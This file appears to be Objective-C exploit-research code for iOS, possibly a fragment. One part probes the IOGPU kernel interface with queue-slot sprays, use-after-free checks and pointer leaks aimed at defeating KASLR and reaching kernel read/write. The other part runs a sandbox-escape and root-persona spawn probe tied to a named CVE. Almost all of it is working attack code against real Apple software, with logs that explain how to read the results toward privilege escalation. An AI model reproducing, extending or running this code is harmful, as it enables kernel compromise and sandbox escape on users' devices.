    kern_return_t r16post = pCall(conn, 16, sc16, 1, NULL, 0, NULL, NULL, NULL, NULL);
    QSLOG(@"sel=16 on old qid AFTER spray -> 0x%08x%s", (unsigned)r16post,
          r16post == 0 ? @" (slot reuse or still-valid NQ — NOT KRW by itself)" : @"");

    uint8_t so[0x40]; memset(so, 0, sizeof(so));
    size_t sos = sizeof(so);
    uint64_t osc[4] = {0}; uint32_t oscn = 4;
    void *argsLeak = calloc(1, 0x410);
    memset((uint8_t *)argsLeak + 0x10, 0x43, 0x3f0);
    *(uint32_t *)((uint8_t *)argsLeak + 0x400) = 0;
    *(uint8_t *)((uint8_t *)argsLeak + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
    kern_return_t r7 = pCall(conn, 6, NULL, 0, argsLeak, 0x410, osc, &oscn, so, &sos);
    QSLOG(@"sel=7 after spray -> 0x%08x oscn=%u sos=%zu osc0=0x%llx osc1=0x%llx so0=0x%llx so1=0x%llx",
          (unsigned)r7, oscn, sos, osc[0], osc[1], *(uint64_t *)so, *(uint64_t *)(so+8));
    int saw42 = 0;
    for (size_t i = 0; i + 8 <= sos; i += 8) {
        if (*(uint64_t *)(so + i) == 0x4242424242424242ULL) saw42++;
    }
    QSLOG(@"structOut 0x42 qword count=%d (0 = memcpy scratch not returned; expected)", saw42);
    (void)keepQ;
    free(argsLeak);
    free(argsA);

    if (pDevRelease) pDevRelease(dev);
    pRelease(svc);
    QSLOG(@"DONE — paste back.");
    QSLOG(@"Read: reused_slot_count>0 = qid recycled into a real new queue.");
    QSLOG(@"sel=16 OK after spray without reused_slot = interesting; still not KRW.");
    QSLOG(@"mode=5 Create OK = +0x400 check missing. panic = stop, pull panic log.");
    if (fd >= 0) close(fd);
    #undef QSLOG
    return out;
}
// ==== END P010QueueSpray.inc.h ====

// ==== BEGIN inlined P010Remain.inc.h ====
// P010 remaining leads — A14 26.5 / 23F77 (retargeted from XR 22H311)
//
// 1) sel=7: A14 often needs inSize > XR's 0x408 (sweep). Exact out 0x10.
//    Kernel writes structOut = { qid, *(queue+0x558) } on A14 (XR was +0x550).
// 2) sel=26 submit (4 scalars + struct, 0 out) with +0x400 = 0..4.
// 3) Metal blit = control that hardware submit works.
// 4) NQ: sel=15/25/16 as before.
//
// Do NOT race vs IOServiceClose (userspace dead-port). Panic = stop.

+ (NSString *)runP010Remain {
    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p010remain"];
    if (stop) return stop;
    NSMutableString *out = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *lp = [docs stringByAppendingPathComponent:@"p010_remain.txt"];
    int fd = open([lp UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);
    #define RLOG(...) do { \
        NSString *_l = [NSString stringWithFormat:__VA_ARGS__]; \
        [out appendString:_l]; [out appendString:@"\n"]; \
        if (fd >= 0) { const char *_s = [_l UTF8String]; write(fd, _s, strlen(_s)); write(fd, "\n", 1); fcntl(fd, F_FULLFSYNC); } \
    } while (0)

    RLOG(@"time %@", [NSDate date]);
    RLOG(@"=== P010 remain: sel7 leak + sel26 submit + NQ (A14 23F77) ===");
    RLOG(@"[*] A14 leak word1 = *(queue+0x%x); XR was +0x550", A14_23F77_IOGPU_QUEUE_LEAK);
    RLOG(@"No IOServiceClose race. Panic = stop, pull panic log.");

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iokit || !iogpu) { RLOG(@"STOP dlopen"); if (fd>=0) close(fd); return out; }

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);
    typedef kern_return_t (*QueueSubmit_t)(void *, void *, uint32_t);
    DevCreate_t pDevCreate = dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pGetConn = dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueGetID_t pGetID = dlsym(iogpu, "IOGPUCommandQueueGetID");
    QueueSubmit_t pSubmit = dlsym(iogpu, "IOGPUCommandQueueSubmitCommandBuffers");
    if (!pMatching || !pGet || !pCall || !pMainPort || !pDevCreate || !pGetConn) {
        RLOG(@"STOP dlsym"); if (fd>=0) close(fd); return out;
    }

    io_service_t svc = pGet(*pMainPort, pMatching("IOGPU"));
    if (!svc) { RLOG(@"STOP no IOGPU"); if (fd>=0) close(fd); return out; }
    void *dev = pDevCreate(svc);
    if (!dev) { RLOG(@"STOP DeviceCreate"); pRelease(svc); if (fd>=0) close(fd); return out; }
    io_connect_t conn = pGetConn(dev);
    uint32_t typeId = *(uint32_t *)((uint8_t *)dev + 0x08);
    RLOG(@"conn=%u Submit=%@ type_id=0x%x", conn, pSubmit ? @"yes" : @"NO", typeId);

    RLOG(@"CHK Metal blit control");
    {
        id<MTLDevice> mtl = MTLCreateSystemDefaultDevice();
        if (!mtl) { RLOG(@"  Metal: no device"); }
        else {
            id<MTLCommandQueue> mq = [mtl newCommandQueue];
            id<MTLBuffer> buf = [mtl newBufferWithLength:4096 options:MTLResourceStorageModeShared];
            id<MTLCommandBuffer> cb = [mq commandBuffer];
            id<MTLBlitCommandEncoder> blit = [cb blitCommandEncoder];
            if (blit) {
                [blit fillBuffer:buf range:NSMakeRange(0, 4) value:1];
                [blit endEncoding];
                [cb commit];
                [cb waitUntilCompleted];
                RLOG(@"  blit status=%ld error=%@", (long)[cb status], [cb error] ?: @"(none)");
            } else {
                RLOG(@"  no blit encoder");
            }
        }
    }

    RLOG(@"CHK QueueCreate sel=6 size sweep (A14 expected 0x410, word1 +0x558)");
    uint32_t liveQid = 0;
    void *liveQueue = NULL;
    uint32_t bestSz = A14_23F77_IOGPU_QUEUE_CREATE_SIZE;
    for (uint32_t sz = A14_23F77_IOGPU_QUEUE_CREATE_SIZE; sz <= 0x600; sz += 8) {
        uint8_t inBuf[0x600];
        memset(inBuf, 0, sizeof(inBuf));
        *(uint32_t *)(inBuf + 0x400) = 1;
        *(uint8_t *)(inBuf + 0x404) = (uint8_t)typeId;
        uint8_t outBuf[0x10];
        memset(outBuf, 0, sizeof(outBuf));
        size_t outCnt = sizeof(outBuf);
        kern_return_t r = pCall(conn, 6, NULL, 0, inBuf, sz, NULL, NULL, outBuf, &outCnt);
        if (r == 0) {
            bestSz = sz;
            uint64_t w0 = *(uint64_t *)outBuf;
            uint64_t w1 = *(uint64_t *)(outBuf + 8);
            RLOG(@"  sel=7 OK sz=0x%x w0=0x%llx w1=0x%llx (expect w1 from queue+0x%x)",
                 sz, w0, w1, A14_23F77_IOGPU_QUEUE_LEAK);
            liveQid = (uint32_t)w0;
            break;
        }
    }
    RLOG(@"CHK sel=7 modes 0..5 at sz=0x%x", bestSz);
    for (uint32_t mode = 0; mode <= 5; mode++) {
        uint8_t inBuf[0x600];
        memset(inBuf, 0, sizeof(inBuf));
        *(uint32_t *)(inBuf + 0x400) = mode;
        *(uint8_t *)(inBuf + 0x404) = (uint8_t)typeId;
        uint8_t outBuf[0x10];
        memset(outBuf, 0, sizeof(outBuf));
        size_t outCnt = sizeof(outBuf);
        RLOG(@"  FIRE sel=7 mode=%u", mode);
        kern_return_t r = pCall(conn, 6, NULL, 0, inBuf, bestSz, NULL, NULL, outBuf, &outCnt);
        uint64_t w0 = *(uint64_t *)outBuf;
        uint64_t w1 = *(uint64_t *)(outBuf + 8);
        uint32_t qidLo = (uint32_t)w0;
        int kptr = ((w1 >> 48) == 0xFFFF || (w1 >> 48) == 0xFFFE);
        RLOG(@"    -> 0x%08x outCnt=%zu w0=0x%llx (qid=%u) w1=0x%llx kptr=%d",
             (unsigned)r, outCnt, w0, qidLo, w1, kptr);
        if (r == 0 && mode <= 4 && !liveQueue && pQueueCreate) {
            liveQid = qidLo;
        }
        if (r == 0 && mode == 5) {
            RLOG(@"    mode=5 Create OK — kernel <=4 check NOT applied on this path");
        }
    }

    if (pQueueCreate) {
        uint8_t args[0x600];
        memset(args, 0, sizeof(args));
        *(uint32_t *)(args + 0x400) = 1;
        *(uint8_t *)(args + 0x404) = (uint8_t)typeId;
        liveQueue = pQueueCreate(dev, args, bestSz);
        if (liveQueue && pGetID) liveQid = pGetID(liveQueue);
        RLOG(@"userspace queue=%p qid=%u", liveQueue, liveQid);
    }

    RLOG(@"CHK sel=26 submit stride=0x40 count=1 (modes via userspace queue +0x400)");
    for (uint32_t mode = 0; mode <= 4; mode++) {
        uint8_t args[0x600];
        memset(args, 0, sizeof(args));
        *(uint32_t *)(args + 0x400) = mode;
        *(uint8_t *)(args + 0x404) = (uint8_t)typeId;
        void *q = pQueueCreate ? pQueueCreate(dev, args, bestSz) : NULL;
        uint32_t qid = (q && pGetID) ? pGetID(q) : liveQid;
        uint8_t st[0x40];
        memset(st, 0, sizeof(st));
        uint64_t sc[4] = { qid, 0, 1, 0x40 };
        RLOG(@"  FIRE sel=26 mode=%u qid=%u", mode, qid);
        kern_return_t r = pCall(conn, 25, sc, 4, st, sizeof(st), NULL, NULL, NULL, NULL);
        RLOG(@"    sel=26 -> 0x%08x", (unsigned)r);
        if (pSubmit && q) {
            kern_return_t s = pSubmit(q, st, 1);
            RLOG(@"    Submit(queue, 0x40, 1) -> 0x%08x", (unsigned)s);
        }
    }

    RLOG(@"CHK NQ sel=15 / sel=25 / sel=16 / sel=8");
    {
        uint64_t s15[2] = { 0x40, 1 }; // in0 in [1,0x2000], in1 < 0x29
        uint8_t nqOut[0x10];
        memset(nqOut, 0, sizeof(nqOut));
        size_t nqOutCnt = sizeof(nqOut);
        kern_return_t r15 = pCall(conn, 15, s15, 2, NULL, 0, NULL, NULL, nqOut, &nqOutCnt);
        uint64_t nqW0 = *(uint64_t *)nqOut;
        uint32_t nqQid = *(uint32_t *)(nqOut + 8);
        RLOG(@"  sel=15 {0x40,1} -> 0x%08x outCnt=%zu w0=0x%llx nqQid=%u",
             (unsigned)r15, nqOutCnt, nqW0, nqQid);

        if (r15 == 0 && liveQid) {
            uint64_t s25[2] = { liveQid, nqQid };
            kern_return_t r25 = pCall(conn, 25, s25, 2, NULL, 0, NULL, NULL, NULL, NULL);
            RLOG(@"  sel=25 bind queue=%u nq=%u -> 0x%08x (0=bound, 0xe00002c9=busy)",
                 liveQid, nqQid, (unsigned)r25);

            uint64_t s16[1] = { nqQid };
            kern_return_t r16a = pCall(conn, 16, s16, 1, NULL, 0, NULL, NULL, NULL, NULL);
            RLOG(@"  sel=16 NQ while bound -> 0x%08x (0=registry dropped, NQ should live on queue)",
                 (unsigned)r16a);

            uint64_t s8[1] = { liveQid };
            kern_return_t r8 = pCall(conn, 8, s8, 1, NULL, 0, NULL, NULL, NULL, NULL);
            RLOG(@"  sel=8 destroy queue -> 0x%08x", (unsigned)r8);

            kern_return_t r16b = pCall(conn, 16, s16, 1, NULL, 0, NULL, NULL, NULL, NULL);
            RLOG(@"  sel=16 NQ after queue death -> 0x%08x (BadArg=already gone / balanced)",
                 (unsigned)r16b);

            uint64_t s43[2] = { 0, nqQid };
            uint64_t o43[2] = { 0, 0 };
            uint32_t o43n = 2;
            kern_return_t r43 = pCall(conn, 43, s43, 2, NULL, 0, o43, &o43n, NULL, NULL);
            RLOG(@"  sel=43 {0,nq} -> 0x%08x o0=0x%llx o1=0x%llx", (unsigned)r43, o43[0], o43[1]);
            uint64_t s45[2] = { (uint32_t)o43[0], nqQid };
            kern_return_t r45 = pCall(conn, 45, s45, 2, NULL, 0, NULL, NULL, NULL, NULL);
            RLOG(@"  sel=45 ioq=%u nq=%u -> 0x%08x", (uint32_t)o43[0], nqQid, (unsigned)r45);
        }
    }

    if (pDevRelease) pDevRelease(dev);
    pRelease(svc);
    RLOG(@"DONE — paste back.");
    RLOG(@"Read: sel7 w1 with top 16 bits FFFF/FFFE = kernel heap leak (KASLR).");
    RLOG(@"sel26 0 = submit reached AGX. panic on a mode = +0x450 index bug.");
    RLOG(@"NQ: bind 0 then sel16-while-bound 0 then sel16-after-death BadArg = balanced (static NO-GO).");
    if (fd >= 0) close(fd);
    #undef RLOG
    return out;
}
// ==== END P010Remain.inc.h ====

@end

// SpawnAttrsProbe (own class) — was after @end include
//
//  SpawnAttrsProbe.inc — CVE-2026-28951 probe (XR 18.7.5 train).
//  On A14 26.5 this is inventory-only — CVE train is XR; expect AMFI/EPERM
//  noise, not a 26.5 primary lead.
//

#import <spawn.h>
#import <signal.h>
#import <sys/wait.h>
#import <sys/stat.h>

// libproc / proc_pidinfo are not in the iOS SDK; declare what we need.
extern int proc_pidinfo(int pid, int flavor, uint64_t arg, void *buffer, int buffersize);
struct sbp_bsdinfo {
    uint32_t pbi_flags, pbi_status, pbi_xstatus, pbi_pid, pbi_ppid;
    uid_t pbi_uid, pbi_gid, pbi_ruid, pbi_rgid, pbi_svuid, pbi_svgid;
    uint32_t rfu_1;
    char pbi_comm[17], pbi_name[17];
    uint32_t pbi_nfiles, pbi_pgid, pbi_pjobc, e_tdev, e_tpgid;
    int32_t pbi_nice;
    uint64_t pbi_start_tvsec, pbi_start_tvusec;
};
#define SBP_PROC_PIDTBSDINFO 3

extern char **environ;

extern int posix_spawnattr_setmacpolicyinfo_np(posix_spawnattr_t *attr,
                                               const char *policy,
                                               void *data, size_t len);
extern int sandbox_check(pid_t pid, const char *type, int flags, ...);
extern mach_port_t bootstrap_port;
extern kern_return_t bootstrap_look_up(mach_port_t bp, const char *name, mach_port_t *sp);

#ifndef SANDBOX_FILTER_NONE
#define SANDBOX_FILTER_NONE 0
#endif
#ifndef SANDBOX_FILTER_PATH
#define SANDBOX_FILTER_PATH 1
#endif
#ifndef POSIX_SPAWN_START_SUSPENDED
#define POSIX_SPAWN_START_SUSPENDED 0x0080
#endif

typedef int (*set_persona_fn)(posix_spawnattr_t *, uid_t, uint32_t);
typedef int (*set_persona_uid_fn)(posix_spawnattr_t *, uid_t);

typedef struct {
    uint32_t version;
    uint32_t size;
    uint32_t profileNameLen;
    uint32_t containerLen;
    char profileName[0x40];
    char container[0x400];
} sandbox_spawnattr_t;

static void sbp_blob_fill(sandbox_spawnattr_t *sb, const char *profile, const char *container) {
    memset(sb, 0, sizeof(*sb));
    sb->version = 0;
    sb->size = (uint32_t)sizeof(*sb);
    if (profile) {
        size_t l = strlen(profile);
        if (l > 0x3f) l = 0x3f;
        memcpy(sb->profileName, profile, l);
        sb->profileName[l] = 0;
        sb->profileNameLen = (uint32_t)l;
    }
    if (container) {
        size_t l = strlen(container);
        if (l > 0x3ff) l = 0x3ff;
        memcpy(sb->container, container, l);
        sb->container[l] = 0;
        sb->containerLen = (uint32_t)l;
    }
}

static const char *sbp_err(int e) {
    if (e == 0) return "ok";
    const char *s = strerror(e);
    return s ? s : "?";
}

static void sbp_check(NSMutableString *out, const char *op, int filter, const char *arg) {
    errno = 0;
    int r = (filter == SANDBOX_FILTER_PATH && arg)
        ? sandbox_check(getpid(), op, SANDBOX_FILTER_PATH, arg)
        : sandbox_check(getpid(), op, SANDBOX_FILTER_NONE);
    int e = errno;
    [out appendFormat:@"  sandbox_check(%s%s%s) = %d errno=%d %s  %s\n",
     op,
     arg ? " " : "",
     arg ? arg : "",
     r, e, sbp_err(e),
     r == 0 ? "ALLOW" : "DENY"];
}

static int sbp_spawn_flags(const char *exe, const char **argv,
                           short flags,
                           int useBlob, const char *profile,
                           int usePersona0,
                           int *spawnErr, pid_t *outPid) {
    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    if (flags)
        posix_spawnattr_setflags(&attr, flags);
    if (useBlob && profile) {
        sandbox_spawnattr_t sb;
        sbp_blob_fill(&sb, profile, "");
        int e = posix_spawnattr_setmacpolicyinfo_np(&attr, "Sandbox", &sb, sizeof(sb));
        if (e) { *spawnErr = 1000 + e; posix_spawnattr_destroy(&attr); return -1; }
    }
    if (usePersona0) {
        set_persona_fn setP = (set_persona_fn)dlsym(RTLD_DEFAULT, "posix_spawnattr_set_persona_np");
        set_persona_uid_fn setU = (set_persona_uid_fn)dlsym(RTLD_DEFAULT, "posix_spawnattr_set_persona_uid_np");
        if (setP) {
            int e = setP(&attr, 99, 1); // persona 99 + OVERRIDE is a common root-persona attempt
            (void)e;
        }
        if (setU) {
            int e = setU(&attr, 0);
            if (e) { *spawnErr = 2000 + e; posix_spawnattr_destroy(&attr); return -1; }
        } else {
            *spawnErr = 2099;
            posix_spawnattr_destroy(&attr);
            return -1;
        }
    }
    pid_t pid = -1;
    int se = posix_spawn(&pid, exe, NULL, &attr, (char *const *)argv, environ);
    posix_spawnattr_destroy(&attr);
    *spawnErr = se;
    if (se) return -1;
    *outPid = pid;
    return 0;
}

static void sbp_inspect_kill(NSMutableString *out, pid_t pid) {
    int sc = sandbox_check(pid, NULL, SANDBOX_FILTER_NONE);
    int sce = errno;
    struct sbp_bsdinfo info;
    memset(&info, 0, sizeof(info));
    int n = proc_pidinfo(pid, SBP_PROC_PIDTBSDINFO, 0, &info, (int)sizeof(info));
    [out appendFormat:@"    child pid=%d sandbox_check(NULL)=%d errno=%d  proc_pidinfo=%d uid=%u gid=%u\n",
     pid, sc, sce, n, info.pbi_uid, info.pbi_gid];
    kill(pid, SIGKILL);
    int st = 0;
    waitpid(pid, &st, 0);
}

@implementation SpawnAttrsProbe

+ (void)runChildIfNeeded {
    NSArray *a = [[NSProcessInfo processInfo] arguments];
    NSUInteger idx = [a indexOfObject:@"--sb-child"];
    if (idx == NSNotFound) return;
    _exit(0);
}

+ (NSString *)runSpawnAttrsProbe {
    NSMutableString *out = [NSMutableString string];
    char exe[1024];
    uint32_t sz = sizeof exe;
    if (_NSGetExecutablePath(exe, &sz) != 0) return @"_NSGetExecutablePath failed";

    [out appendFormat:@"=== 28951 spawnattrs probe v2 (XR 18.7.5) ===\n"];
    [out appendFormat:@"exe=%s\nuid=%u gid=%u pid=%d\n\n", exe, getuid(), getgid(), getpid()];

    [out appendString:@"--- parent sandbox_check ---\n"];
    sbp_check(out, NULL, SANDBOX_FILTER_NONE, NULL);
    sbp_check(out, "process-fork", SANDBOX_FILTER_NONE, NULL);
    sbp_check(out, "process-exec", SANDBOX_FILTER_PATH, exe);
    sbp_check(out, "file-read-data", SANDBOX_FILTER_PATH, exe);

    const char *candidates[] = {
        exe,
        "/usr/libexec/xpcproxy",
        "/usr/bin/true",
        "/bin/ps",
        "/sbin/launchd",
        "/usr/libexec/amfid",
        "/usr/libexec/debugserver",
        NULL
    };
    for (int i = 0; candidates[i]; i++) {
        sbp_check(out, "process-exec", SANDBOX_FILTER_PATH, candidates[i]);
    }

    [out appendString:@"\n--- fork (no exec) ---\n"];
    pid_t f = fork();
    if (f == 0) _exit(42);
    if (f < 0) {
        [out appendFormat:@"  fork errno=%d %s\n", errno, sbp_err(errno)];
    } else {
        int st = 0;
        waitpid(f, &st, 0);
        [out appendFormat:@"  fork pid=%d wait=%d exited=%d status=%d\n",
         f, st, WIFEXITED(st), WIFEXITED(st) ? WEXITSTATUS(st) : -1];
    }

    [out appendString:@"\n--- posix_spawn /usr/bin/true (plain) ---\n"];
    const char *trueArgv[] = { "/usr/bin/true", NULL };
    {
        int se = 0; pid_t pid = -1;
        int r = sbp_spawn_flags("/usr/bin/true", trueArgv, 0, 0, NULL, 0, &se, &pid);
        [out appendFormat:@"  spawn=%d %s", se, sbp_err(se)];
        if (r == 0) { [out appendString:@"\n"]; sbp_inspect_kill(out, pid); }
        else [out appendString:@"\n"];
    }

    [out appendString:@"\n--- blob applied to SELF via POSIX_SPAWN_SETEXEC ---\n"];
    [out appendString:@"  (child never runs; we inspect the returned pid's label)\n"];
    const char *profiles[] = {
        "nointernet", "container", "mediaserverd", "debugserver",
        "backboardd", "test-common", NULL
    };
    for (int i = 0; profiles[i]; i++) {
        int se = 0; pid_t pid = -1;
        int r = sbp_spawn_flags("/usr/bin/true", trueArgv, POSIX_SPAWN_SETEXEC,
                                1, profiles[i], 0, &se, &pid);
        if (r == 0) {
            [out appendFormat:@"  %-14s spawn=0 pid=%d  ", profiles[i], pid];
            sbp_inspect_kill(out, pid);
        } else {
            [out appendFormat:@"  %-14s spawn=%d %s\n", profiles[i], se, sbp_err(se)];
        }
    }

    [out appendString:@"\n--- persona uid=0 (SETEXEC) ---\n"];
    {
        int se = 0; pid_t pid = -1;
        int r = sbp_spawn_flags("/usr/bin/true", trueArgv, POSIX_SPAWN_SETEXEC,
                                0, NULL, 1, &se, &pid);
        if (r == 0) {
            [out appendFormat:@"  spawn=0 pid=%d  ", pid];
            sbp_inspect_kill(out, pid);
        } else {
            [out appendFormat:@"  spawn=%d %s\n", se, sbp_err(se)];
        }
    }

    [out appendString:@"\nREAD: process-fork is denied, so any normal posix_spawn is EPERM.\n"
                      "SETEXEC skips fork — if spawn=0, the blob was accepted and the label\n"
                      "was applied to the new process image. Child sandbox_check/uid tells us\n"
                      "which profile landed. This is the 28951 test that does not need fork.\nDONE\n"];
    return out;
}

@end


